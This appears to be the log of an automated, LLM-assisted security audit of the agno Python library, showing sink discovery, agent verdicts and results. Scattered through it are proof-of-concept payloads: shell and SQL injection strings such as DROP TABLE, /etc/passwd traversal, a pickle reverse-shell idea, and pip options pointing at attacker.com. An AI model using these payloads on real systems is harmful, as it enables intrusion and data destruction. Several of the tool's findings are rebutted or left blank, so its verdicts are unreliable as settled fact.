@@ -1,0 +1,517 @@
+agies — auditing /tmp/agno/libs/agno
+
+  Languages: JSON, Python, Shell, YAML
+  Files: 1832
+
+
+Phase A: Path Discovery
+  Backend: tree-sitter
+  Functions: 8591
+    Remote Code Execution: 18 sink(s)
+    Local File Inclusion: 39 sink(s)
+    Server-Side Request Forgery: 40 sink(s)
+    SQL Injection: 58 sink(s)
+    ReDoS (Regular Expression DoS): 20 sink(s)
+    XML External Entity (XXE) — XML parser with insecure defaults: 2 sink(s)
+    Server-Side Template Injection (SSTI) — template engine with user input: 2 
+sink(s)
+    Suspicious — requires analysis (path constructor / logic pattern): 18 
+sink(s)
+
+Phase B: Slice Sorting (197 raw paths)
+  Body-detected orphans: 36 (no call chain)
+  Exploit: 30 + Explore: 15
+    Explore: sqli-000 _find_paused_executor_run score=0.65 (non_std_sink, 
+unusual_naming)
+    Explore: sqli-001 acontinue_run score=0.65 (non_std_sink, unusual_naming)
+    Explore: sqli-002 _acontinue_execute score=0.65 (non_std_sink, 
+unusual_naming)
+  Project type: app
+
+Phase C: README Understanding
+  No README found.
+  (skipped)
+
+Phase D: Intent+Logic Agents (45 slices)
+  [1/45] lfi-000 (file)
+  [2/45] rce-001 (validate_cel_expression)
+  [3/45] redos-002 (validate_phone_number)
+  [4/45] sqli-003 (execute)
+  [5/45] ssrf-004 (async_search)
+  [6/45] ssti-005 (_format_message_with_state_variables)
+  [7/45] suspicious-006 (_has_windows_path_prefix)
+  [8/45] xxe-007 (fetch_pubmed_ids)
+    ✓ 1/10 — safe
+    Evidence: rce-001...
+    ? 10/10 — interesting
+    Evidence: redos-002...
+    ? 10/10 — interesting
+    Evidence: xxe-007...
+  [9/45] sqli-008 (validate_human_review_for_parallel)
+    ? pattern match, LLM skeptical (7 match(es))
+  [10/45] redos-009 (validate_email)
+    ? pattern match, LLM skeptical (1 match(es))
+  [11/45] rce-010 (unpickle_object_from_file)
+    ✓ 2/10 — safe
+    Evidence: lfi-000...
+    ✓ 0/10 — safe
+    Evidence: ssrf-004...
+    ? pattern match, LLM skeptical (3 match(es))
+  [12/45] rce-011 (run_shell_command)
+    ? pattern match, LLM skeptical (2 match(es))
+  [13/45] rce-012 (run_python_code)
+    ⚠ 10/10 — 1 contradiction(s)
+    Adversary: rce-010...
+    ? 10/10 — interesting
+    Evidence: redos-009...
+    ? 10/10 — interesting
+    Evidence: suspicious-006...
+  [14/45] rce-013 (run_shell_command)
+    ✓ not rebutted
+      weak point: The function is a public API with no authentication or access 
+control, and pickle.load() is inherently unsafe. The verify_class check occurs 
+after deserialization, so it does not prevent RCE. Exploitation is 
+straightforward if an attacker can control the file path or file content.
+    PoC Agent: rce-010...
+    ✓ 2/10 — safe
+    Evidence: ssti-005...
+  [15/45] rce-014 (create_file)
+    ? 10/10 — interesting
+    Evidence: sqli-008...
+    ? pattern match, LLM skeptical (1 match(es))
+  [16/45] rce-015 (list_files)
+    ? pattern match, LLM skeptical (1 match(es))
+  [17/45] rce-016 (delete_file)
+    ✓ 2/10 — safe
+    Evidence: sqli-003...
+    ⚠ 10/10 — 1 contradiction(s)
+    Adversary: rce-012...
+    ⚠ 10/10 — 1 contradiction(s)
+    Adversary: rce-011...
+    ✓ not rebutted
+      weak point: The function directly calls exec() on the 'code' parameter 
+without any sanitization. Although safe_globals and safe_locals may restrict 
+builtins, exec() can still execute arbitrary code. The function is a public API,
+and the 'code' parameter is attacker-controlled. No input validation or access 
+control is present.
+    PoC Agent: rce-012...
+    ? pattern match, LLM skeptical (11 match(es))
+  [18/45] redos-017 (_build_ts_query)
+    ✓ not rebutted
+      weak point: The finding is hard to disprove because the code directly 
+passes user-controlled input into a shell command without sanitization, and the 
+function is a public API that can be called by an attacker.
+    PoC Agent: rce-011...
+    ⚠ 10/10 — 1 contradiction(s)
+    Adversary: rce-013...
+    ? 10/10 — interesting
+    Evidence: rce-014...
+    ? 10/10 — interesting
+    Evidence: rce-016...
+    ⚠ 8/10 — 1 contradiction(s)
+    Adversary: rce-015...
+    ? pattern match, LLM skeptical (6 match(es))
+  [19/45] redos-018 (_clean_json_content)
+    ? pattern match, LLM skeptical (6 match(es))
+  [20/45] sqli-019 (migrate_pgvector_table)
+    ✓ not rebutted
+      weak point: The finding is straightforward: unsanitized user input flows 
+into a shell command via subprocess.run with shell=True. No input validation or 
+access control is present. The data flow is clear from the source code.
+    PoC Agent: rce-013...
+    ✗ rebutted
+      reason: The finding claims RCE via path traversal and sandbox escape, but 
+the code uses `shlex.quote()` on the directory path, preventing command 
+injection. The `current_sandbox.process.exec()` is a sandboxed execution 
+environment; the finding assumes it is insecure without evidence. Path traversal
+is possible but only leads to listing arbitrary directories, not RCE. The 
+finding overstates the risk and lacks proof of sandbox misconfiguration.
+    Evidence: rce-015...
+    📄 PoC: 
+/home/xcy/workSpace/code-agies/pocs/agno/rce_function_unpickle_object_uses_unpic
+kle_object_from_file.py
+    Evidence: rce-010...
+    📄 PoC: 
+/home/xcy/workSpace/code-agies/pocs/agno/rce_python_code_leading_rce_run_python_
+code.py
+    Evidence: rce-012...
+    ? pattern match, LLM skeptical (8 match(es))
+  [21/45] sqli-020 (migrate_singlestore_table)
+    ✓ evidence found (7 match(es))
+      PoC: Create a malicious pickle file that executes a reverse shell. Provide
+its path as `file_path`. Example:
+```python
+import pickle
+import os
+
+class Explo...
+    Verifying rce-010...
+    ✓ evidence found (8 match(es))
+      PoC: run_python_code("import os; os.system('id')")...
+    Verifying rce-012...
+    ✓ verification confirmed
+  [22/45] rce-021 (run_shell_command)
+    ✓ verification confirmed
+  [23/45] rce-022 (run_command)
+    📄 PoC: 
+/home/xcy/workSpace/code-agies/pocs/agno/rce_true_implied_string_argument_run_sh
+ell_command.py
+    Evidence: rce-011...
+    📄 PoC: 
+/home/xcy/workSpace/code-agies/pocs/agno/rce_true_implied_string_argument_run_sh
+ell_command_2.py
+    Evidence: rce-013...
+    ⚠ 10/10 — 1 contradiction(s)
+    Adversary: sqli-019...
+    ✓ evidence found (7 match(es))
+      PoC: Call change_directory with directory="/tmp; echo pwned" to execute 
+`cd /tmp; echo pwned`....
+    Verifying rce-011...
+    ✓ not rebutted
+      weak point: The finding is hard to disprove because the code uses 
+f-strings to construct SQL queries with user-controlled table_name and schema 
+parameters, and double-quoting does not prevent injection if the input contains 
+a double quote. No input validation or safe identifier escaping is present.
+    PoC Agent: sqli-019...
+    ? 8/10 — interesting
+    Evidence: redos-017...
+    ✓ evidence found (7 match(es))
+      PoC: directory = '; malicious_command ;'...
+    Verifying rce-013...
+    ✓ verification confirmed
+  [24/45] rce-023 (pip_install_package)
+    ⚠ 10/10 — 1 contradiction(s)
+    Adversary: sqli-020...
+    ✓ verification confirmed
+  [25/45] rce-024 (uv_pip_install_package)
+    ✓ not rebutted
+      weak point: The function is a public API with no input validation or 
+sanitization. The f-string interpolation directly into SQL text() calls allows 
+injection via table_name or schema. No access control or authentication is 
+present in the provided code. Exploitation is practical as an attacker can 
+control both parameters.
+    PoC Agent: sqli-020...
+    ⚠ 10/10 — 1 contradiction(s)
+    Adversary: rce-021...
+    ? pattern match, LLM skeptical (12 match(es))
+  [26/45] rce-025 (run_shell)
+    ✓ not rebutted
+      weak point: The finding is straightforward: user-controlled 'directory' is
+interpolated into a shell command string passed to subprocess.run with 
+shell=True (implied by string argument). No input validation is present. The 
+data flow is clear from the source code.
+    PoC Agent: rce-021...
+    ? 9/10 — interesting
+    Evidence: redos-018...
+    ⚠ 10/10 — 1 contradiction(s)
+    Adversary: rce-023...
+    ✓ not rebutted
+      weak point: The function is a public API with no input validation; 
+package_name is directly passed to pip install, which can execute arbitrary code
+via malicious packages or pip options.
+    PoC Agent: rce-023...
+    ⚠ 10/10 — 1 contradiction(s)
+    Adversary: rce-022...
+    ⚠ 9/10 — 1 contradiction(s)
+    Adversary: rce-024...
+    ? pattern match, LLM skeptical (3 match(es))
+  [27/45] rce-026 (grep)
+    ⚠ 9/10 — 1 contradiction(s)
+    Adversary: rce-025...
+    ✓ not rebutted
+      weak point: The function is a public API with no input validation, and 
+package_name is passed directly to subprocess.check_call. Although shell=False 
+prevents shell injection, argument injection is possible (e.g., 
+--extra-index-url, --find-links) which can lead to code execution during pip 
+install. The developer intent summary lacks security considerations, and the 
+code is reachable from external callers.
+    PoC Agent: rce-024...
+    ✓ not rebutted
+      weak point: The function uses subprocess.run with shell=True and passes 
+the command string directly without sanitization against shell metacharacters. 
+The _check_command method only checks for path traversal, not command injection.
+Although the function is a library API, it is intended to be called with 
+user-supplied commands (e.g., from an agent), making exploitation realistic.
+    PoC Agent: rce-025...
+    ✗ rebutted
+      reason: The finding claims RCE via command injection, but the code uses 
+`subprocess.run` with `shell=False` (default). When `shell=False` and `args` is 
+a string, `subprocess.run` treats the string as the executable path, not a shell
+command. This means no shell metacharacters are interpreted, preventing command 
+injection. The attacker would need to control the executable path to execute an 
+arbitrary binary, which is not the typical RCE scenario. The developer intent 
+mismatch (string vs list) is a bug but does not enable RCE. The finding's 
+exploitability is low and does not constitute a valid RCE vulnerability.
+    Evidence: rce-022...
+    📄 PoC: 
+/home/xcy/workSpace/code-agies/pocs/agno/rce_true_implied_string_argument_run_sh
+ell_command_3.py
+    Evidence: rce-021...
+    📄 PoC: 
+/home/xcy/workSpace/code-agies/pocs/agno/sqli_api_function_exposed_externally_mi
+grate_singlestore_table.py
+    Evidence: sqli-020...
+    📄 PoC: 
+/home/xcy/workSpace/code-agies/pocs/agno/sqli_api_pgvector_constructor_migrate_p
+gvector_table.py
+    Evidence: sqli-019...
+    ? pattern match, LLM skeptical (8 match(es))
+  [28/45] rce-027 (run_script)
+    ? 10/10 — interesting
+    Evidence: rce-026...
+    ✓ evidence found (7 match(es))
+    Verifying rce-021...
+    ✓ evidence found (2 match(es))
+      PoC: If table_name is set to `users; DROP TABLE users; --`, the resulting 
+query becomes `ALTER TABLE `schema`.`users; DROP TABLE users; --` ADD COLUMN 
+cont...
+    Verifying sqli-020...
+    ✓ verification confirmed
+  [29/45] rce-028 (_evaluate_cel_raw)
+    ✓ evidence found (4 match(es))
+      PoC: Set table_name to '" ; DROP TABLE users; --' and schema to 'public' 
+(or any valid schema). The resulting SQL will be: ALTER TABLE "public"."" ; DROP
+T...
+    Verifying sqli-019...
+    ? pattern match, LLM skeptical (9 match(es))
+  [30/45] rce-029 (_create_table)
+    ✓ verification confirmed
+  [31/45] sqli-000 (_find_paused_executor_run)
+    ✓ verification confirmed
+  [32/45] sqli-001 (acontinue_run)
+    📄 PoC: 
+/home/xcy/workSpace/code-agies/pocs/agno/rce_false_but_as_part_pip_install_packa
+ge.py
+    Evidence: rce-023...
+    ✓ evidence found (8 match(es))
+      PoC: pip_install_package('--extra-index-url http://attacker.com/packages 
+malicious_package')...
+    Verifying rce-023...
+    📄 PoC: 
+/home/xcy/workSpace/code-agies/pocs/agno/rce_inject_arbitrary_commands_run_shell
+.py
+    Evidence: rce-025...
+    ✓ verification confirmed
+  [33/45] sqli-002 (_acontinue_execute)
+    ✓ 2/10 — safe
+    Evidence: rce-027...
+    ✓ evidence found (9 match(es))
+      PoC: If an attacker can control the `command` parameter, e.g., via a web 
+request or other input, they can execute arbitrary commands. Example: `command =
+'...
+    Verifying rce-025...
+    📄 PoC: 
+/home/xcy/workSpace/code-agies/pocs/agno/rce_developer_intended_install_package_
+uv_pip_install_package.py
+    Evidence: rce-024...
+    ✓ verification confirmed
+  [34/45] sqli-003 (aexecute)
+    ? pattern match, LLM skeptical (9 match(es))
+  [35/45] sqli-004 (aexecute_stream)
+    ✓ evidence found (8 match(es))
+      PoC: package_name = '--extra-index-url http://attacker.com/evil'...
+    Verifying rce-024...
+    ✓ verification confirmed
+  [36/45] sqli-005 (aexecute)
+    ? 10/10 — interesting
+    Evidence: rce-029...
+    ✓ 0/10 — safe
+    Evidence: sqli-000...
+    ? 10/10 — interesting
+    Evidence: sqli-001...
+    ? pattern match, LLM skeptical (6 match(es))
+  [37/45] sqli-006 (aexecute_stream)
+    ⚠ 8/10 — 1 contradiction(s)
+    Adversary: rce-028...
+    ? pattern match, LLM skeptical (1 match(es))
+  [38/45] redos-007 (_find_by_name)
+    ✗ rebutted
+      reason: The finding claims RCE via CEL expression evaluation, but the CEL 
+expression is hardcoded in the router selector (a developer-defined string), not
+attacker-controlled. The context dictionary includes user-controlled data 
+(step_input, session_state), but CEL is a sandboxed, non-Turing-complete 
+language that does not allow arbitrary code execution. The `cel-python` library 
+does not expose Python objects or functions to CEL expressions. No evidence of a
+vulnerability in `cel-python` is provided. The data flow trace shows the 
+expression originates from developer code, not user input. Therefore, 
+exploitation is not possible.
+    Evidence: rce-028...
+    ? pattern match, LLM skeptical (7 match(es))
+  [39/45] redos-008 (_apply_inline_tag)
+    ? 10/10 — interesting
+    Evidence: sqli-002...
+    ? pattern match, LLM skeptical (7 match(es))
+  [40/45] sqli-009 (_acontinue_execute_stream)
+    ? pattern match, LLM skeptical (4 match(es))
+  [41/45] lfi-010 (pcm_to_wav_bytes)
+    ? 10/10 — interesting
+    Evidence: sqli-004...
+    ? 10/10 — interesting
+    Evidence: sqli-003...
+    ? 10/10 — interesting
+    Evidence: sqli-005...
+    ? pattern match, LLM skeptical (9 match(es))
+  [42/45] lfi-011 (download_file)
+    ? pattern match, LLM skeptical (8 match(es))
+  [43/45] redos-012 (attach_routes)
+    ? pattern match, LLM skeptical (8 match(es))
+  [44/45] lfi-013 (_get_image_dimensions)
+    ? 10/10 — interesting
+    Evidence: sqli-006...
+    ? pattern match, LLM skeptical (9 match(es))
+  [45/45] redos-014 (_close_unterminated_fences)
+    ? 9/10 — interesting
+    Evidence: redos-008...
+    ? pattern match, LLM skeptical (13 match(es))
+    ? 10/10 — interesting
+    Evidence: lfi-010...
+    ? 10/10 — interesting
+    Evidence: redos-012...
+    ? pattern match, LLM skeptical (4 match(es))
+    ? 10/10 — interesting
+    Evidence: sqli-009...
+    ? 10/10 — interesting
+    Evidence: lfi-011...
+    ? pattern match, LLM skeptical (5 match(es))
+    ? pattern match, LLM skeptical (4 match(es))
+    ⚠ 8/10 — 1 contradiction(s)
+    Adversary: lfi-013...
+    ✗ rebutted
+      reason: The finding claims a path traversal vulnerability in 
+`_get_image_dimensions` via `image.filepath`. However, the data flow trace is 
+speculative and lacks evidence that an attacker can control `image.filepath` in 
+a real execution path. The call chain from `_reprovision_routers` to 
+`count_tokens` involves internal API routes and database operations that are not
+directly exposed to untrusted user input. The `Image` objects in 
+`_count_media_tokens` come from `message.images`, which are populated from 
+structured message data, not from arbitrary file paths. There is no demonstrated
+mechanism for an attacker to inject a malicious `filepath` into an `Image` 
+object that reaches the sink. Additionally, the sink function 
+`_get_image_dimensions` is a utility that reads from `image.filepath` only if 
+`image.content` is absent, and the `Image` class likely validates or constructs 
+`filepath` internally. Without concrete evidence of untrusted input reaching 
+`image.filepath`, the finding is not exploitable.
+    Evidence: lfi-013...
+    ? 10/10 — interesting
+    Evidence: redos-014...
+    ? pattern match, LLM skeptical (13 match(es))
+    ? pattern match, LLM skeptical (5 match(es))
+    ✓ 0/10 — safe
+    Evidence: redos-007...
+    ? pattern match, LLM skeptical (1 match(es))
+
+Phase E: Results
+  Blackboard: 55 cached intents, 248 knowledge entries, 44 phase results
+  High confidence (37):
+    sqli-001: ? — ?
+      
+    redos-002: ? — ?
+      
+    sqli-002: ? — ?
+      
+    sqli-003: ? — ?
+      
+    sqli-004: ? — ?
+      
+    sqli-005: ? — ?
+      
+    sqli-006: ? — ?
+      
+    sqli-008: ? — ?
+      
+    redos-008: ? — ?
+      
+    redos-009: ? — ?
+      
+    sqli-009: ? — ?
+      
+    rce-010: pickle.load — logic_gap
+      Create a malicious pickle file that executes a reverse shell when loaded. 
+Provide its path as file_path.
+    lfi-010: ? — ?
+      
+    rce-011: subprocess.run — logic_gap
+      cd /tmp; echo pwned
+    lfi-011: ? — ?
+      
+    rce-012: exec — logic_gap
+      exec("import os; os.system('id')")
+    rce-013: subprocess.run — logic_gap
+      directory = '; malicious_command ;'
+    lfi-013: open — logic_gap
+      Set image.filepath to '/etc/passwd' or '../../../../etc/passwd' to read 
+arbitrary files.
+    rce-014: ? — ?
+      
+    redos-014: ? — ?
+      
+    rce-015: exec — logic_gap
+      If the sandbox is not properly isolated, an attacker could provide 
+directory='; malicious_command' to execute arbitrary commands. However, 
+shlex.quote() prevents this. A more likely attack is path traversal to read 
+sensitive files.
+    rce-016: ? — ?
+      
+    redos-017: ? — ?
+      
+    redos-018: ? — ?
+      
+    sqli-019: sess.execute — logic_gap
+      Set table_name to '" ; DROP TABLE users; --' to execute arbitrary SQL.
+    sqli-020: sess.execute — logic_gap
+      If table_name is set to `users; DROP TABLE users; --`, the resulting query
+becomes `ALTER TABLE `schema`.`users; DROP TABLE users; --` ADD COLUMN 
+content_hash TEXT;` which would execute the DROP statement.
+    rce-021: subprocess.run — logic_gap
+      If an attacker can control the 'directory' parameter, they can execute 
+arbitrary commands. For example, setting directory to '; id' would execute the 
+'id' command.
+    rce-022: subprocess.run — logic_gap
+      If the attacker can control the `command` string and the system has a 
+shell executable at that path, e.g., '/bin/sh', then the command will be 
+executed as a shell. But since `shell=False`, the string is passed as the 
+executable, so the attacker would need to provide a path to a malicious 
+executable. This is unlikely. A more realistic bypass is if the attacker can 
+inject arguments via the string, but `subprocess.run` with a string and 
+`shell=False` treats the entire string as the executable path, so no argument 
+injection. Thus, no practical RCE.
+    rce-023: subprocess.check_call — logic_gap
+      pip install --extra-index-url http://attacker.com/packages 
+malicious_package
+    rce-024: subprocess.check_call — logic_gap
+      package_name = '--extra-index-url http://attacker.com/evil && pip install 
+malicious_pkg' or package_name = '$(python -c "import os; os.system('id')")' 
+(though shell=False limits some injections, argument injection is still 
+possible).
+    rce-025: subprocess.run — logic_gap
+      If the command parameter is 'ls; echo pwned', the shell will execute both 
+commands.
+    rce-026: ? — ?
+      
+    rce-028: celpy.Environment().program().evaluate() — logic_gap
+      
+    rce-029: ? — ?
+      
+
+Pipeline Complete
+  Target: /tmp/agno/libs/agno
+  Model: deepseek-chat
+  Duration: 252.2s
+  Paths discovered: 197
+  Slices analyzed: 45
+  Findings: 37 high, 7 interesting
+  Tokens: 1,110,334 total (1,017,498 prompt + 92,836 completion)
+
+  Recommended verification targets:
+    SQLI sqli-001: Code-level pattern evidence (1 matches): ?:# Handle the 
+updated tools (execute confirmed tools, etc.
+    REDOS redos-002: Code-level pattern evidence (1 matches): ?:return 
+bool(re.match(r"^\+[1-9]\d{1,14}$", phone))
+    SQLI sqli-002: Code-level pattern evidence (4 matches): ?:# Handle the 
+updated tools (execute confirmed tools, etc.
+    SQLI sqli-003: Code-level pattern evidence (8 matches): ?:# Handle the 
+updated tools (execute confirmed tools, etc.
+    SQLI sqli-004: Code-level pattern evidence (9 matches): ?:summary="Execute 
+Workflow",; ?:"Execute a workflow with t
+
+v3 CodeQL pipeline complete.
